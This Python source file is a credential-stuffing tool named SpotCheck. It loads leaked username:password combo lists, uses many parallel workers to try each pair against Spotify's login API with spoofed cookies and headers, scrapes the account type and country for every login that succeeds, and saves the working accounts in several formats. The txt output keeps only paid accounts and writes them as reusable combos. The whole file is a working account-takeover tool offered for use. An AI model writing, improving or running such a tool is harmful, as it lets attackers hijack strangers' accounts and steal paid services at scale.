# <-- Checker imports -->
import requests
from bs4 import BeautifulSoup
# <-- End -->

# <-- Colors imports -->
from colorama import init, Fore
# <-- End -->

# <-- Utils imports -->
from os.path import exists, isfile
from os import _exit, system, name
from multiprocessing import Pool, cpu_count
from tqdm import tqdm
import argparse
import xml.etree.ElementTree as ET
from json import dump

# <-- End -->

VERSION = "v0.4-Stable"

init()


class Output(object):
    def __init__(self, output_type, output_file):

        self.good_types = ["txt", "json", "xml", "html"]
        self.type = output_type.lower()
        self.file = output_file

        if not self.type in self.good_types:
            colors.error("Output type not avaible, exiting...")
            _exit(1)

    def Save_html(self, accounts):
        """
        Output accounts (Working accounts and bad accounts) to a HTML file
        with information of the account.
        """
        try:

            self.extension = ".html"

            colors.info("Saving as HTML in {}{}".format(self.file, self.extension))

            SpotifyFree = []
            SpotifyPremium = []
            PremiumFamily = []
            AdminPremiumFamily = []
            BadAccounts = []

            for account in accounts:
                if account.get("account_login") == "error":
                    BadAccounts.append({"Username": account["Username"], "Password": account["Password"]})
                else:
                    if account.get("AccountType") == "Spotify Free":
                        SpotifyFree.append({"Username": account["Username"], "Password": account["Password"],
                                            "Country": account["Country"]})
                    elif account.get("AccountType") == "Spotify Premium":
                        SpotifyPremium.append({"Username": account["Username"], "Password": account["Password"],
                                               "Country": account["Country"]})
                    elif account.get("AccountType") == "Premium Family":
                        if account.get("Admin"):
                            AdminPremiumFamily.append({"Username": account["Username"], "Password": account["Password"],
                                                       "Country": account["Country"]})
                        else:
                            PremiumFamily.append({"Username": account["Username"], "Password": account["Password"],
                                                  "Country": account["Country"]})

            html = "<html>\n<head>\n<title>SpotCheck HTML Result</title>\n</head>"
            html += "<div align='center'>\n"

            html += "<h1>Spotify Free</h1>"
            html += "<table>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Country</th>\n</tr>\n"

            for account in SpotifyFree:
                html += "<tr>\n<td>{}</td>\n<td>{}</td>\n<td>{}</td>\n</tr>\n".format(account["Username"],
                                                                                      account["Password"],
                                                                                      account["Country"])

            html += "</table>\n<br>\n<br>"

            html += "<h1>Spotify Premium</h1>"
            html += "<table>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Country</th>\n</tr>\n"

            for account in SpotifyPremium:
                html += "<tr>\n<td>{}</td>\n<td>{}</td>\n<td>{}</td>\n</tr>\n".format(account["Username"],
                                                                                      account["Password"],
                                                                                      account["Country"])

            html += "</table>\n<br>\n<br>"

            html += "<h1>Premium Family</h1>"
            html += "<table>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Country</th>\n</tr>\n"

            for account in PremiumFamily:
                html += "<tr>\n<td>{}</td>\n<td>{}</td>\n<td>{}</td>\n</tr>\n".format(account["Username"],
                                                                                      account["Password"],
                                                                                      account["Country"])

            html += "</table>\n<br>\n<br>"

            html += "<h1>Admin of Premium Family</h1>"
            html += "<table>\n<tr>\n<th>Username</th>\n<th>Password</th>\n<th>Country</th>\n</tr>\n"

            for account in AdminPremiumFamily:
                html += "<tr>\n<td>{}</td>\n<td>{}</td>\n<td>{}</td>\n</tr>\n".format(account["Username"],
                                                                                      account["Password"],
                                                                                      account["Country"])

            html += "</table>\n<br>\n<br>"

            html += "<h1>Bad Accounts</h1>"
            html += "<table>\n<tr>\n<th>Username</th>\n<th>Password</th>\n</tr>\n"

            for account in BadAccounts:
                html += "<tr>\n<td>{}</td>\n<td>{}</td>\n</tr>\n".format(account["Username"], account["Password"])

            html += "</table>\n<br>\n<br>"

            html += "<h3>Result generated by SpotCheck (www.github.com/MrSentex/SpotCheck)</h3>\n"

            with open(self.file + self.extension, "w") as output_:
                output_.write(html)
                output_.close()

            colors.correct("Done! All saved successfully")

        except Exception as e:
            colors.error(str(e))
            _exit(1)

    def Save_xml(self, accounts):
        """
        Output accounts (Working accounts and bad accounts) to a XML file
        with information of the account.
        """
        try:

            self.extension = ".xml"

            colors.info("Saving as XML in {}{}".format(self.file, self.extension))

            Main = ET.Element("SpotCheck")

            SpotifyFree = ET.SubElement(Main, 'SpotifyFree')
            SpotifyPremium = ET.SubElement(Main, 'SpotifyPremium')
            PremiumFamily = ET.SubElement(Main, 'PremiumFamily')
            AdminPremiumFamily = ET.SubElement(Main, 'AdminPremiumFamily')
            BadAccounts = ET.SubElement(Main, 'BadAccounts')

            for account in accounts:
                if account.get("account_login") == "error":
                    temp = ET.SubElement(BadAccounts, "account")
                    temp.set("Username", account["Username"])
                    temp.set("Password", account["Password"])
                else:
                    if account.get("AccountType") == "Spotify Free":
                        temp = ET.SubElement(SpotifyFree, "account")
                        temp.set("Username", account["Username"])
                        temp.set("Password", account["Password"])
                        temp.set("Country", account["Country"])
                    elif account.get("AccountType") == "Spotify Premium":
                        temp = ET.SubElement(SpotifyPremium, "account")
                        temp.set("Username", account["Username"])
                        temp.set("Password", account["Password"])
                        temp.set("Country", account["Country"])
                    elif account.get("AccountType") == "Premium Family":
                        if account.get("Admin"):
                            temp = ET.SubElement(AdminPremiumFamily, "account")
                            temp.set("Username", account["Username"])
                            temp.set("Password", account["Password"])
                            temp.set("Country", account["Country"])
                        else:
                            temp = ET.SubElement(PremiumFamily, "account")
                            temp.set("Username", account["Username"])
                            temp.set("Password", account["Password"])
                            temp.set("Country", account["Country"])
            XML = ET.tostring(Main)
            with open(self.file + self.extension, "w") as output_:
                output_.write(XML)
            colors.correct("Done! All saved successfully")
        except Exception as e:
            colors.error(str(e))
            _exit(1)

    def Save_json(self, accounts):
        """
        Ouput accounts (Working accounts and bad accounts) to a JSON file with
        information of the account.
        """
        try:
            self.extension = ".json"

            colors.info("Saving as JSON in {}{}".format(self.file, self.extension))

            json = {}
            json["Spotify Free"] = []
            json["Spotify Premium"] = []
            json["Premium Family"] = []
            json["Admin of Premium Family"] = []
            json["Bad Accounts"] = []

            for account in accounts:
                if account.get("account_login") == "error":
                    json["Bad Accounts"].append({"Username": account["Username"], "Password": account["Password"]})
                else:
                    if account.get("AccountType") == "Spotify Free":
                        json["Spotify Free"].append({"Username": account["Username"], "Password": account["Password"],
                                                     "Country": account["Country"]})
                    elif account.get("AccountType") == "Spotify Premium":
                        json["Spotify Premium"].append(
                            {"Username": account["Username"], "Password": account["Password"],
                             "Country": account["Country"]})
                    elif account.get("AccountType") == "Premium Family":
                        if account["Admin"]:
                            json["Admin of Premium Family"].append(
                                {"Username": account["Username"], "Password": account["Password"],
                                 "Country": account["Country"]})
                        else:
                            json["Premium Family"].append(
                                {"Username": account["Username"], "Password": account["Password"],
                                 "Country": account["Country"]})
                    else:
                        print(str(account))
            with open(self.file + self.extension, "w") as output_:
                dump(json, output_)
                output_.close()
            colors.correct("Done! All saved successfully")
        except Exception as e:
            colors.error(str(e))
            _exit(1)

    def Save_txt(self, accounts):
        """
        Output only the working accounts to a TXT file with information
        of the account.
        """

        self.extension = ".txt"

        self.sep = "<--------Account-------->\n"

        colors.info("Saving as TXT in {}{}".format(self.file, self.extension))

        try:
            with open(self.file + self.extension, "a") as output_:
                for account in accounts:
                    if account.get("account_login") == "success":
                        if account.get("AccountType") != "Spotify Free":
                            output_.write(self.sep)
                            output_.write("Username: {}\n".format(account["Username"]))
                            output_.write("Password: {}\n".format(account["Password"]))
                            output_.write("As Combo: {}:{}\n".format(account["Username"], account["Password"]))
                            output_.write("Account Type: {}\n".format(account["AccountType"]))
                            output_.write("Country: {}\n".format(account["Country"]))
                            output_.write("Admin: {}\n".format(account["Admin"]))
                output_.close()
            colors.correct("Done! All saved successfully")
        except Exception as e:
            colors.error(str(e))
            _exit(1)

    def Save(self, accounts):

        if self.type == "txt":
            self.Save_txt(accounts)
        elif self.type == "json":
            self.Save_json(accounts)
        elif self.type == "xml":
            self.Save_xml(accounts)
        elif self.type == "html":
            self.Save_html(accounts)


class Spotify(object):
    def getCSRFtoken(self):
        while True:
            csrf_request = requests.get('https://accounts.spotify.com')
            if csrf_request.status_code == 200:
                break
        return csrf_request.cookies.get("csrf_token")

    def getAccountInfo(self, Session, email, password):
        while True:
            response = Session.get('https://www.spotify.com/de/account/overview/')
            if response.status_code == 200:
                break
        data = response.text

        parser = BeautifulSoup(data, "lxml")

        account_type = parser.find("h3", attrs={"class": "product-name"}).text
        country = parser.find("p", attrs={"class": "form-control-static", "id": "card-profile-country"}).text
        admin = None

        if account_type == "Premium Family":
            if len(parser.find_all("h3", attrs={"class": "product-name"})) == 2:
                admin = True
            else:
                admin = False

        return {"account_login": "success", "Username": email, "Password": password, "AccountType": account_type,
                "Country": country, "Admin": admin}

    def SpotifyCheck(self, email, password):

        api_request = requests.Session()

        csrf_token = self.getCSRFtoken()

        cookies = {"fb_continue": "https%3A%2F%2Fwww.spotify.com%2Fid%2Faccount%2Foverview%2F",
                   "sp_landing": "play.spotify.com%2F", "sp_landingref": "https%3A%2F%2Fwww.google.com%2F",
                   "user_eligible": "0", "spot": "%7B%22t%22%3A1498061345%2C%22m%22%3A%22id%22%2C%22p%22%3Anull%7D",
                   "sp_t": "ac1439ee6195be76711e73dc0f79f89", "sp_new": "1", "csrf_token": csrf_token,
                   "__bon": "MHwwfC0zMjQyMjQ0ODl8LTEzNjE3NDI4NTM4fDF8MXwxfDE=", "remember": "false@false.com",
                   "_ga": "GA1.2.153026989.1498061376", "_gid": "GA1.2.740264023.1498061376"}
        headers = {
            "User-Agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 8_3 like Mac OS X) AppleWebKit/600.1.4 (KHTML, like Gecko) FxiOS/1.0 Mobile/12F69 Safari/600.1.4",
            "Accept": "application/json, text/plain", "Content-Type": "application/x-www-form-urlencoded"}
        payload = {"remember": "false", "username": email, "password": password, "csrf_token": csrf_token}

        response = api_request.post("https://accounts.spotify.com/api/login", data=payload, headers=headers,
                                    cookies=cookies)

        try:
            if response.json().get("error"):
                return {"account_login": "error", "Username": email, "Password": password}
        except Exception:
            return {"account_login": "error", "Username": email, "Password": password}

        return self.getAccountInfo(api_request, email, password)


class colors:
    @staticmethod
    def info(msg):
        print("[" + Fore.BLUE + "#" + Fore.RESET + "] " + str(msg))

    @staticmethod
    def correct(msg):
        print("[" + Fore.GREEN + "+" + Fore.RESET + "] " + str(msg))

    @staticmethod
    def error(msg):
        print("[" + Fore.RED + "-" + Fore.RESET + "] " + str(msg))

    @staticmethod
    def warning(msg):
        print("[" + Fore.YELLOW + "!" + Fore.RESET + "] " + str(msg))


class Main(object):
    def __init__(self, list, output, threads, output_type, nothread):

        if threads == None:
            threads = cpu_count()
        if output_type == None:
            output_type = "txt"

        self.list = list
        self.output = output
        self.threads = threads
        self.output_type = output_type
        self.nothread = nothread

        self.accounts_array = []
        self.results_array = []

    def print_header(self):
        print(r"""
 ________  ________  ________  _________  ________  ___  ___  _______   ________  ___  __       
|\   ____\|\   __  \|\   __  \|\___   ___\\   ____\|\  \|\  \|\  ___ \ |\   ____\|\  \|\  \     
\ \  \___|\ \  \|\  \ \  \|\  \|___ \  \_\ \  \___|\ \  \\\  \ \   __/|\ \  \___|\ \  \/  /|_   
 \ \_____  \ \   ____\ \  \\\  \   \ \  \ \ \  \    \ \   __  \ \  \_|/_\ \  \    \ \   ___  \  
  \|____|\  \ \  \___|\ \  \\\  \   \ \  \ \ \  \____\ \  \ \  \ \  \_|\ \ \  \____\ \  \\ \  \ 
    ____\_\  \ \__\    \ \_______\   \ \__\ \ \_______\ \__\ \__\ \_______\ \_______\ \__\\ \__\
   |\_________\|__|     \|_______|    \|__|  \|_______|\|__|\|__|\|_______|\|_______|\|__| \|__|
   \|_________|                                                                                 

By MrSentex | @fbi_sentex | www.github.com/MrSentex | www.gitlab.com/MrSentex | {}
""".format(VERSION))

    def clear(self):
        if name == "nt":
            system("cls")
        else:
            system("clear")

    def load_list(self):
        colors.info("Reading combo file...")
        if not exists(self.list):
            colors.error("The combo don't exist")
            _exit(1)
        if not isfile(self.list):
            colors.error("The combo isn't a file")
            _exit(1)
        with open(self.list, "r") as list_file:
            lines = list_file.readlines()
            colors.warning("Loading " + str(len(lines)) + " accounts")
            for line in lines:
                line = line.replace('\n', '')
                account = line.split(":")
                if not len(account) == 2:
                    continue
                self.accounts_array.append({"email": account[0], "password": account[1]})
            colors.correct(str(len(self.accounts_array)) + " accounts have been loaded succesfully\n")

    def SpotCheck(self, account):

        email = account["email"]
        password = account["password"]

        while True:
            try:
                self.results_array.append(Spotify().SpotifyCheck(email, password))
                break
            except Exception:
                pass

    def start_check(self):

        self.clear()
        self.print_header()
        self.load_list()

        Output_Manager = Output(self.output_type, self.output)

        if not self.nothread:

            colors.info("Starting with " + str(self.threads) + " threads\n")

            pool = Pool(self.threads)

            try:
                for _ in tqdm(pool.imap_unordered(self.SpotCheck, self.accounts_array), total=len(self.accounts_array),
                              desc="Processing accounts"):
                    pass
            except KeyboardInterrupt:
                print("\n")
                colors.error("Ctrl + C detected, exiting...\n")
                Output_Manager.Save(self.results_array)
                _exit(0)

        else:

            colors.info("Starting in the main process\n")

            try:
                with tqdm(total=len(self.accounts_array), desc="Processing accounts") as pbar:
                    for account in self.accounts_array:
                        self.SpotCheck(account)
                        pbar.update(1)
            except KeyboardInterrupt:
                print("\n")
                colors.error("Ctrl + C detected, exiting...\n")
                Output_Manager.Save(self.results_array)
                _exit(0)

        print("")
        colors.correct("Process finished!\n")

        Output_Manager.Save(self.results_array)


parser = argparse.ArgumentParser()
parser.add_argument("combo_list",
                    help="The combo list is a list with users and passwords in a 'username:password' format.")
parser.add_argument("output_file_name",
                    help="Only the name of the file. The extension will be determined by the type of output selected.")
parser.add_argument("--output_type", help="The output type can be: txt, json, xml and html (Default: txt).",
                    action="store", type=str)
parser.add_argument("--threads",
                    help="Number of workers that SpotCheck uses (A very high number can cause an error in the program due to the limitations of your computer) (Default: {}).".format(
                        cpu_count()), type=int, action="store")
parser.add_argument("--nothreads",
                    help="If this argument is specified, SpotCheck will not create any thread, otherwise the main SpotCheck process will perform the checks.",
                    action="store_true", default=False)

args = parser.parse_args()

Main(args.combo_list, args.output_file_name, args.threads, args.output_type, args.nothreads).start_check()